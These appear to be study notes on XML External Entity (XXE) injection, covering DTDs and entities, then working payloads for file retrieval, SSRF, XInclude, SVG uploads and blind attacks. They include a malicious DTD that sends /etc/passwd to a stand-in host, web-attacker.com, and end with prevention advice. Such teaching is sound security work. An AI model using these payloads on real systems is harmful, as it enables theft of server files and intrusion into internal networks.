# What is XML External Entity Injection (or XXE)
XXE is a web security vulnerability that allows an attacker **to interfere with an application's processing of XML data**. This allows attackers to:
- View files on the application server filesystem
- Interact with any back-end or external systems that the application itself can access.

In specific situations, an XXE attack can also be used to compromise the underlying server or other parts of the infrastructure connected to the application, by leveraging the XXE to perform SSRF attacks.

![](imgs/xxe-injection.svg)
# What is XML?
XML stands for "eXtensible Markup Language". XML is a language designed **to store and transport data.** Similar to HTML, it has a tree structure of tags and data. Unlike HTML, XML does not use predefined tags, and that means that tags can be given names that describe the data (e.g., "height" if we are storing people information). Nowadays, this format has been replaced by JSON format.

# What are XML external entities?
XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. 
For example, the entities `&lt` and `&gt` represent the characters `<` and `>`.
# What is document type definition?
The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.
Basically, in the DTD you define the structure of the XML document. It can be internal, declared inside the XML doccument, or external, declared outside the XML document.
# What are XML custom entities?
XML allows custom entities to be defined within the DTD. For example:
`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`
This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".

It is basically a way to declare variables. Entities are variables.

# What are XML external entities?
XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared. It is like declaring a variable outside the declaration part of the document, and linking it to an external URL.

The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`
XML external entities provide the primary means by which [XML external entity attacks](https://portswigger.net/web-security/xxe) arise.
# How does XXE vulnerabilities arise?
Some applications use the XML format to transmit data between the browser and the server. The XML format is just a format of presenting objects, variables with values, and it has an universal declaration so everybody can create frameworks around the language.
XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and **standard parsers support these features even if they are not normally used by the application.** 

XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL. As a summary, the value of the variable inside the XML declaration is not "hardcoded", but bound to a value in an external URL or file. This is the attack path.

We will see four different attacks using XXE:
- XXE to **retrieve internal files**
- XXE to perform **SSRF** attacks
- Blind XXE to **exfiltrate data** out-of-band, exfiltrating sensitive data from the application server to a system that the attacker controls.
- Blind XXE to retrieve data **via error messages**, intentionally triggering a parsing error message containing sensitive data.

# Exploiting XXE to retrieve files
Let's perform an XXE injection to retrieve a file from the server's filesystem. This corresponds to the third phase of the exam.
To do that, we have to:
- Introduce a `DOCTYPE element to define an external entity containing the path to the file.
- Or edit a data value in the XML that is returned in the application's response to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
`<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>`

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`

This XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `productId` value. This causes the application's response to include the contents of the file:
`Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...`

Lab that covers this topic: [xxe_retrieve_local_files](labs/xxe_retrieve_local_files.md)

# Exploiting XXE to perform SSRF attacks
We can do a similar attack but retrieve a internal URL to which we don't have access. Instead of declaring `file://`, we can use the HTTP protocol to target any internal resource.

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`

Lab that covers this topic: [xxe_ssrf](labs/xxe_ssrf.md)
## XInclude attacks
Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a `DOCTYPE` element. However, you might be able to use `XInclude` instead. `XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an `XInclude` attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:
`<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`

Lab that covers this topic: [xxe_xinclude](labs/xxe_xinclude.md)

## XXE attacks via file upload
Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.
For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

An example of SVG image with an XXE payload is:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

# XXE attacks via modified content type
Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.

For example, if a normal request contains the following:
`POST /action HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 7 foo=bar`

Then you might be able submit the following request, with the same result:
`POST /action HTTP/1.0 Content-Type: text/xml Content-Length: 52 <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`

If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.

# Blind XXE vulnerabilities

Many instances of XXE vulnerabilities are blind. This means that the application does not return the values of any defined external entities in its responses, and so direct retrieval of server-side files is not possible.

Blind XXE vulnerabilities can still be detected and exploited, but more advanced techniques are required. You can sometimes use out-of-band techniques to find vulnerabilities and exploit them to exfiltrate data. And you can sometimes trigger XML parsing errors that lead to disclosure of sensitive data within error messages.

Being blind means that it is harder to recognize, and also to exploit.
The first way to detect XXE is to perform a SSRF to an endpoint that the attacker controls, in order to verify if the request is being performed by the application. 
This is the first lab that covers this topic: [blind_xxe_ssrf_to_attacker_endpoint](labs/blind_xxe_ssrf_to_attacker_endpoint.md)

## Blind XXE using parameterentity to bypass input validation
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

`<!ENTITY % myparameterentity "my parameter entity value" >`

And second, parameter entities are referenced using the percent character instead of the usual ampersand:
`%myparameterentity;`

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

Here is a lab that covers this topic: [blind_xxe_bypass_input_validation_with_XML_parameter_entities](labs/blind_xxe_bypass_input_validation_with_XML_parameter_entities.md)

## Exploiting blind XXE to exfiltrate data out-of-band

Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:
`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;`

This DTD carries out the following steps:

- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
- Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
- Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:

`http://web-attacker.com/malicious.dtd`

Finally, the attacker must submit the following XXE payload to the vulnerable application:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>`

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the `/etc/passwd` file is transmitted to the attacker's server.

Here is a lab that covers this topic: [blind_xxe_data_exfiltration_external_dtd](labs/blind_xxe_data_exfiltration_external_dtd.md)
## Exploiting blind XXE to retrieve data via error messages
An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:

`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;`

This DTD carries out the following steps:
- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
- Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
- Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.

Invoking the malicious external DTD will result in an error message like the following:

`java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...`

Lab that covers this topic: 

# How to prevent XXE vulnerabilities

Virtually all XXE vulnerabilities arise because the application's XML parsing library supports potentially dangerous XML features that the application does not need or intend to use. The easiest and most effective way to prevent XXE attacks is to disable those features.

Generally, it is sufficient to disable resolution of external entities and disable support for `XInclude`. This can usually be done via configuration options or by programmatically overriding default behavior. Consult the documentation for your XML parsing library or API for details about how to disable unnecessary capabilities.